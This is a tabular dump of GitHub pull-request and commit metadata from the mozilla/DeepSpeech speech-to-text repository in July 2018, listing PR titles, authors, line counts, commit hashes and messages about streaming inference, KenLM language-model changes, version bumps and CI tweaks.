3039,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1473,1473,Add test coverage for training from frozen model,,lissyx,1645737,2018-07-24T09:10:38Z,COLLABORATOR,True,54,2,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,298d11cd76f2d7e54885758780d87af39bcbbf13,Add test coverage for training from frozen model
3040,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1473,1473,Add test coverage for training from frozen model,,lissyx,1645737,2018-07-24T09:10:38Z,COLLABORATOR,True,54,2,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7a613c53921b6ad1ff2135ee4e9666bcdd8fc75f,"Fix training from frozen graph

Fixes #1472"
3041,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1471,1471,kenlm: add penalty for impossible Māori words,"I think this makes words containing consonant clusters considered 10,000 times less likely by the language model (compared to other out-of-vocab words).
",douglasbagnall,131030,2018-07-24T05:24:40Z,NONE,False,165,18,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,72f5648979d63f7e1c3f90c94b6883b51893e6b2,A few tweaks to DeepSpeech defaults and useful tiny utils
3042,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1471,1471,kenlm: add penalty for impossible Māori words,"I think this makes words containing consonant clusters considered 10,000 times less likely by the language model (compared to other out-of-vocab words).
",douglasbagnall,131030,2018-07-24T05:24:40Z,NONE,False,165,18,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ee240c38312dd0174c7f807c1e358835818b485c,make Deepspeech a bit more robust to various thing
3043,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1471,1471,kenlm: add penalty for impossible Māori words,"I think this makes words containing consonant clusters considered 10,000 times less likely by the language model (compared to other out-of-vocab words).
",douglasbagnall,131030,2018-07-24T05:24:40Z,NONE,False,165,18,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ebdf0bdb992c09e64f93762ef45f2fb382b2f952,"Remove keyword argument that has default value

When no `type` keyword argument is passed to the `add_argument` method
of an `argparse.ArgumentParser`, the type will be `str` by default and
therefore this does not need to be specified."
3044,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1471,1471,kenlm: add penalty for impossible Māori words,"I think this makes words containing consonant clusters considered 10,000 times less likely by the language model (compared to other out-of-vocab words).
",douglasbagnall,131030,2018-07-24T05:24:40Z,NONE,False,165,18,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,333995bb896fefcbf01cfbb34f31e7187b184891,Fixes #1236 (Switch KenLM to trie based language model)
3045,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1471,1471,kenlm: add penalty for impossible Māori words,"I think this makes words containing consonant clusters considered 10,000 times less likely by the language model (compared to other out-of-vocab words).
",douglasbagnall,131030,2018-07-24T05:24:40Z,NONE,False,165,18,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f2037536f3d3b2e2a192fade363a0147f3f03179,Added quntized array language model and trie
3046,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1471,1471,kenlm: add penalty for impossible Māori words,"I think this makes words containing consonant clusters considered 10,000 times less likely by the language model (compared to other out-of-vocab words).
",douglasbagnall,131030,2018-07-24T05:24:40Z,NONE,False,165,18,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8d9c82aa5318534f3798b19cbcef3455269d1aa1,Update VERSION to 0.2.0-alpha.6
3047,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1471,1471,kenlm: add penalty for impossible Māori words,"I think this makes words containing consonant clusters considered 10,000 times less likely by the language model (compared to other out-of-vocab words).
",douglasbagnall,131030,2018-07-24T05:24:40Z,NONE,False,165,18,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,761926239dbfb26fafdb4000bc6dedfd0c5f3038,"Add NodeJS v10.x

Fixes #1394"
3048,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1471,1471,kenlm: add penalty for impossible Māori words,"I think this makes words containing consonant clusters considered 10,000 times less likely by the language model (compared to other out-of-vocab words).
",douglasbagnall,131030,2018-07-24T05:24:40Z,NONE,False,165,18,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9b45febd4114728ef1c7c73177e4adb17a809087,"Add Python 3.7.0b5

Fixes #1395"
3049,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1471,1471,kenlm: add penalty for impossible Māori words,"I think this makes words containing consonant clusters considered 10,000 times less likely by the language model (compared to other out-of-vocab words).
",douglasbagnall,131030,2018-07-24T05:24:40Z,NONE,False,165,18,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d8beabe59fda8b86af7bceaba47f6bf34b19359e,tweak gitignore
3050,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1471,1471,kenlm: add penalty for impossible Māori words,"I think this makes words containing consonant clusters considered 10,000 times less likely by the language model (compared to other out-of-vocab words).
",douglasbagnall,131030,2018-07-24T05:24:40Z,NONE,False,165,18,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dedc97d106b17adb1a4f556addae964930fe6f44,add loss - this aint gonna work but you gotta start somewhere
3051,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1471,1471,kenlm: add penalty for impossible Māori words,"I think this makes words containing consonant clusters considered 10,000 times less likely by the language model (compared to other out-of-vocab words).
",douglasbagnall,131030,2018-07-24T05:24:40Z,NONE,False,165,18,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,88fff498a036e03ce492bf6bfd340749a421c2df,Add more info about tracking loss and hyper params to Tensorboards
3052,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1471,1471,kenlm: add penalty for impossible Māori words,"I think this makes words containing consonant clusters considered 10,000 times less likely by the language model (compared to other out-of-vocab words).
",douglasbagnall,131030,2018-07-24T05:24:40Z,NONE,False,165,18,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6c7c32130d1460cbdda95927e9e84d1d3c4b8dbd,"Merge pull request #1 from utunga/track_loss

Add more info about tracking loss and hyper params to Tensorboards"
3053,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1471,1471,kenlm: add penalty for impossible Māori words,"I think this makes words containing consonant clusters considered 10,000 times less likely by the language model (compared to other out-of-vocab words).
",douglasbagnall,131030,2018-07-24T05:24:40Z,NONE,False,165,18,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c468c7f169e317b797ddd08d99143d1e6b37d996,Merged mozilla latest with utunga master
3054,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1471,1471,kenlm: add penalty for impossible Māori words,"I think this makes words containing consonant clusters considered 10,000 times less likely by the language model (compared to other out-of-vocab words).
",douglasbagnall,131030,2018-07-24T05:24:40Z,NONE,False,165,18,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,709d1ca1573a4e096b944a40849be8ef63dc249c,Added 'prebuilt-binaries' to .gitignore
3055,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1471,1471,kenlm: add penalty for impossible Māori words,"I think this makes words containing consonant clusters considered 10,000 times less likely by the language model (compared to other out-of-vocab words).
",douglasbagnall,131030,2018-07-24T05:24:40Z,NONE,False,165,18,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5be24629e57c3618a774b0e9f7e1217615c099eb,kenlm: add penalty for impossible Māori words
3056,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1470,1470,Bump to version 0.2.0-alpha.8,,lissyx,1645737,2018-07-23T17:36:47Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d03d48ec1676654d7972b2b8a8488498e3cb0ef1,Bump to version 0.2.0-alpha.8
3057,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1465,1465,"Revert ""Fixes #1236 (Switch KenLM to trie based language model)""",This reverts commit e34c52fcb98854c5ecc5639a8ace6196f5825fbd.,lissyx,1645737,2018-07-20T17:24:51Z,COLLABORATOR,True,119497,400017,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,650f7f851d36868651101ac963eae7983bc45666,"Revert ""Fixes #1236 (Switch KenLM to trie based language model)""

This reverts commit e34c52fcb98854c5ecc5639a8ace6196f5825fbd."
3058,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1465,1465,"Revert ""Fixes #1236 (Switch KenLM to trie based language model)""",This reverts commit e34c52fcb98854c5ecc5639a8ace6196f5825fbd.,lissyx,1645737,2018-07-20T17:24:51Z,COLLABORATOR,True,119497,400017,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3f2a5209419d3f6f3d2373d8416a8cd9e42b8b52,"Revert ""Added quntized array language model and trie""

This reverts commit 754ecd831bdbdf106d1cec759bb6e153cfd93739."
3059,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1463,1463,Streaming Inference 2: Electric Boogaloo,,reuben,477142,2018-07-19T14:17:29Z,MEMBER,True,1779,1382,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,400c9c0e5dbcf499f3cc2bf6af1dc3cf84ce8142,Streaming inference
3060,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1463,1463,Streaming Inference 2: Electric Boogaloo,,reuben,477142,2018-07-19T14:17:29Z,MEMBER,True,1779,1382,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d2be00fad008df371b77055ea8ff9d95ed4877af,Add tool to find out which ops are needed by a graph
3061,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1463,1463,Streaming Inference 2: Electric Boogaloo,,reuben,477142,2018-07-19T14:17:29Z,MEMBER,True,1779,1382,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e438ed6f8c9360a08df7fc46a77df83a7ac57fcc,Update native_client/BUILD comment about binary sizes
3062,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1463,1463,Streaming Inference 2: Electric Boogaloo,,reuben,477142,2018-07-19T14:17:29Z,MEMBER,True,1779,1382,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4e383ac59f23956f91a42825dab4125b052259c8,Add tool to convert graph protobuf to pbtxt
3063,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1463,1463,Streaming Inference 2: Electric Boogaloo,,reuben,477142,2018-07-19T14:17:29Z,MEMBER,True,1779,1382,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,831ebf40813deab68c9875b0cef073bc63cc9989,Add evaluate.py script to create a WER report from a checkpoint using the inference graph
3064,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1463,1463,Streaming Inference 2: Electric Boogaloo,,reuben,477142,2018-07-19T14:17:29Z,MEMBER,True,1779,1382,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,49490f5e68c0cbb2add00762d3a64df870b72103,Increase CI training epochs to guarantee overfitting
3065,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1463,1463,Streaming Inference 2: Electric Boogaloo,,reuben,477142,2018-07-19T14:17:29Z,MEMBER,True,1779,1382,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ae9c62cae9e4d05df572a57278b711c71b49483c,Convert native API to C instead of C++
3066,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1463,1463,Streaming Inference 2: Electric Boogaloo,,reuben,477142,2018-07-19T14:17:29Z,MEMBER,True,1779,1382,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cc84bb658abcf91870c049bbbaa3437a23c6404a,Remove some deepspeech_utils references that crept up during rebase
3067,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1463,1463,Streaming Inference 2: Electric Boogaloo,,reuben,477142,2018-07-19T14:17:29Z,MEMBER,True,1779,1382,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9b8871cd946bf020f756035ba9a42f8f529c5188,Infer n_steps and n_context from model file
3068,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1463,1463,Streaming Inference 2: Electric Boogaloo,,reuben,477142,2018-07-19T14:17:29Z,MEMBER,True,1779,1382,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0b95ed698168dc06bf645a4b03ef17f0429b6b95,Switch to LSTMBlockFusedCell
3069,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1463,1463,Streaming Inference 2: Electric Boogaloo,,reuben,477142,2018-07-19T14:17:29Z,MEMBER,True,1779,1382,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,48778fcd0e4721e861135f798b4ac7340c3b399b,Don't handle dropout rates as Python values
3070,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1463,1463,Streaming Inference 2: Electric Boogaloo,,reuben,477142,2018-07-19T14:17:29Z,MEMBER,True,1779,1382,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8f810ee0017be73c85d0c9554c395e0217cbfad7,Add intermediateDecode method to the API
3071,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1463,1463,Streaming Inference 2: Electric Boogaloo,,reuben,477142,2018-07-19T14:17:29Z,MEMBER,True,1779,1382,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cbb33c85637876145d6c0e279743c5397f4fbd24,Finalize training graph before starting training
3072,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1463,1463,Streaming Inference 2: Electric Boogaloo,,reuben,477142,2018-07-19T14:17:29Z,MEMBER,True,1779,1382,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ac41fe0006a723cd1f76c3124f0fea21b40e21a8,Disable AOT tasks
3073,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1463,1463,Streaming Inference 2: Electric Boogaloo,,reuben,477142,2018-07-19T14:17:29Z,MEMBER,True,1779,1382,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,385bc7a65fecea519bc5733b1c42015422dd7ed3,Remove word count bonus in favor of length normalization
3074,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1463,1463,Streaming Inference 2: Electric Boogaloo,,reuben,477142,2018-07-19T14:17:29Z,MEMBER,True,1779,1382,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8fecc33333c4855087c02d15a6a91b89c3494598,Architecture changes from training
3075,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1463,1463,Streaming Inference 2: Electric Boogaloo,,reuben,477142,2018-07-19T14:17:29Z,MEMBER,True,1779,1382,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c579b74a1d934c5064a5328c6f5bcb89bc3e6814,Switch to updated head in TensorFlow r1.6 branch
3076,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1463,1463,Streaming Inference 2: Electric Boogaloo,,reuben,477142,2018-07-19T14:17:29Z,MEMBER,True,1779,1382,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,75091a8ef376d77ad68ae868006d153019080c19,Switch prod model to a streaming based one
3077,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1463,1463,Streaming Inference 2: Electric Boogaloo,,reuben,477142,2018-07-19T14:17:29Z,MEMBER,True,1779,1382,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,51cac1031b69bf07193821fe8b6fbbc97bb9ef8a,Address review comments
3078,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1462,1462,Remove useless training dep,,lissyx,1645737,2018-07-19T13:54:04Z,COLLABORATOR,True,0,14,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b455b2423622c707c19d97ab34f4d0667ef2bf4c,Remove useless training dep
3079,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1461,1461,Merge tf master,,lissyx,1645737,2018-07-19T10:25:55Z,COLLABORATOR,True,401229,120081,106,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,21d26563fae8c56e23b62e6970107eb0515ac5f2,added Dockerfile
3080,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1461,1461,Merge tf master,,lissyx,1645737,2018-07-19T10:25:55Z,COLLABORATOR,True,401229,120081,106,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e01784894ed6f7ce21d5c389f8725fc474a08ef7,"Unify version definition

Fixes #1293"
3081,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1461,1461,Merge tf master,,lissyx,1645737,2018-07-19T10:25:55Z,COLLABORATOR,True,401229,120081,106,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6c463445e357426ed2a8e2b5d54fb7ddc8ccb170,"Fix version extraction on OSX

Fixes #1359"
3082,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1461,1461,Merge tf master,,lissyx,1645737,2018-07-19T10:25:55Z,COLLABORATOR,True,401229,120081,106,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,69cec810bd14b0a508beb1a7122e512981b3dff5,"Merge pull request #1357 from lissyx/versions

Unify version definition"
3083,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1461,1461,Merge tf master,,lissyx,1645737,2018-07-19T10:25:55Z,COLLABORATOR,True,401229,120081,106,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,258a4443643f452b2c7385b31dc2bf37e5e6bbf4,Add missing branch filtering for v0.2.0-alpha.0
3084,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1461,1461,Merge tf master,,lissyx,1645737,2018-07-19T10:25:55Z,COLLABORATOR,True,401229,120081,106,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8ee559872b9dc526521b75d05db9957e7520326b,"Merge pull request #1360 from lissyx/fix-versions-branch

Add missing branch filtering for v0.2.0-alpha.0

X-DeepSpeech: NOBUILD"
3085,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1461,1461,Merge tf master,,lissyx,1645737,2018-07-19T10:25:55Z,COLLABORATOR,True,401229,120081,106,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f4491531cfdd2191080750cdcecfb844f19e5e7d,"Use new 'tag' event

X-DeepSpeech: NOBUILD"
3086,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1461,1461,Merge tf master,,lissyx,1645737,2018-07-19T10:25:55Z,COLLABORATOR,True,401229,120081,106,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e36c9b8fe2727a69ab376f0a6e529a533381b2a5,"Merge pull request #1361 from lissyx/add-tag-event

Use new 'tag' event

X-DeepSpeech: NOBUILD"
3087,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1461,1461,Merge tf master,,lissyx,1645737,2018-07-19T10:25:55Z,COLLABORATOR,True,401229,120081,106,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5520a6b29dce780b4cfdbe509206026fff69d63c,Improve tag handling
3088,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1461,1461,Merge tf master,,lissyx,1645737,2018-07-19T10:25:55Z,COLLABORATOR,True,401229,120081,106,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b5856b1b2dcf98f79a31181964409fea58b4ee8e,"Merge pull request #1362 from lissyx/tag_more

Improve tag handling"
3089,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1461,1461,Merge tf master,,lissyx,1645737,2018-07-19T10:25:55Z,COLLABORATOR,True,401229,120081,106,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,02980ee46dab705f496a5b9067c17a3f9339e2e1,Avoid tc-decision.py breakage
3090,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1461,1461,Merge tf master,,lissyx,1645737,2018-07-19T10:25:55Z,COLLABORATOR,True,401229,120081,106,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a2670b49ad836e43b5c114a8e2e42808d4a64ed9,"Merge pull request #1363 from lissyx/tag_more_more

Avoid tc-decision.py breakage"
3091,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1461,1461,Merge tf master,,lissyx,1645737,2018-07-19T10:25:55Z,COLLABORATOR,True,401229,120081,106,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,10ac90473006ce65ec93283b0f8c17f061b47e2e,Avoid duplicated tag name for routes
3092,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1461,1461,Merge tf master,,lissyx,1645737,2018-07-19T10:25:55Z,COLLABORATOR,True,401229,120081,106,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,57f237136f4f8ffcceec4f754c10759482d374e8,"Merge pull request #1364 from lissyx/tag_more_more_fix

Avoid duplicated tag name for routes"
3093,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1461,1461,Merge tf master,,lissyx,1645737,2018-07-19T10:25:55Z,COLLABORATOR,True,401229,120081,106,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5ee4c4a0d2d581f522adfba89bc30f6c33a27751,Remove Aarch64 packages from upload
3094,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1461,1461,Merge tf master,,lissyx,1645737,2018-07-19T10:25:55Z,COLLABORATOR,True,401229,120081,106,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0435991279966b7b9be38bb39ee8a2eb9c66783b,"Merge pull request #1365 from lissyx/remove-aarch64

Remove Aarch64 packages from upload"
3095,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1461,1461,Merge tf master,,lissyx,1645737,2018-07-19T10:25:55Z,COLLABORATOR,True,401229,120081,106,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d293b6866e90796974b9afc91e0f9b877dcab870,Bump to v0.2.0-alpha.1
3096,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1461,1461,Merge tf master,,lissyx,1645737,2018-07-19T10:25:55Z,COLLABORATOR,True,401229,120081,106,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,74f458aa9f7fb285adfd602cfc59f2ea35846562,"Merge pull request #1366 from lissyx/new-ver

Bump to v0.2.0-alpha.1"
3097,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1461,1461,Merge tf master,,lissyx,1645737,2018-07-19T10:25:55Z,COLLABORATOR,True,401229,120081,106,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,05bc98ca862111ee47f9e3dee5cdc0cc46efac4e,Also remove aarch64 from packages pulling
3098,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1461,1461,Merge tf master,,lissyx,1645737,2018-07-19T10:25:55Z,COLLABORATOR,True,401229,120081,106,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,26a090426bd8e5609a19292f2257b86e361f4bbf,"Merge pull request #1367 from lissyx/arm64-nomore

Also remove aarch64 from packages pulling"
3099,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1461,1461,Merge tf master,,lissyx,1645737,2018-07-19T10:25:55Z,COLLABORATOR,True,401229,120081,106,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,34a1b4f09bcf384b5e27fe2b73f087e8b0e3b841,Bump to v0.2.0-alpha.3
3100,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1461,1461,Merge tf master,,lissyx,1645737,2018-07-19T10:25:55Z,COLLABORATOR,True,401229,120081,106,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bcde01fab5c36a17fd22fd4c6d28dc298c189fac,"Merge pull request #1369 from lissyx/newver

Bump to v0.2.0-alpha.3"
3101,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1461,1461,Merge tf master,,lissyx,1645737,2018-07-19T10:25:55Z,COLLABORATOR,True,401229,120081,106,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8eb7a58f508906d45eb4eacd38decc0b251c02df,"fixed --cuda flag, added cpu optimization flags"
3102,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1461,1461,Merge tf master,,lissyx,1645737,2018-07-19T10:25:55Z,COLLABORATOR,True,401229,120081,106,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1873ac6f5e7357a55281e63849d200540fb34414,"Merge pull request #1358 from GeorgeFedoseev/docker-file

added Dockerfile

X-DeepSpeech: NOBUILD"
3103,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1461,1461,Merge tf master,,lissyx,1645737,2018-07-19T10:25:55Z,COLLABORATOR,True,401229,120081,106,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,378663d991dcbb21aab818b2b51e79cd5cb9c123,"Improve packages docs references and links

Fixes #1376"
3104,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1461,1461,Merge tf master,,lissyx,1645737,2018-07-19T10:25:55Z,COLLABORATOR,True,401229,120081,106,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4685c1d2cb7038a899e063aed2d64c39187e8ab1,"Merge pull request #1377 from lissyx/packages-readme

Improve packages docs references and links"
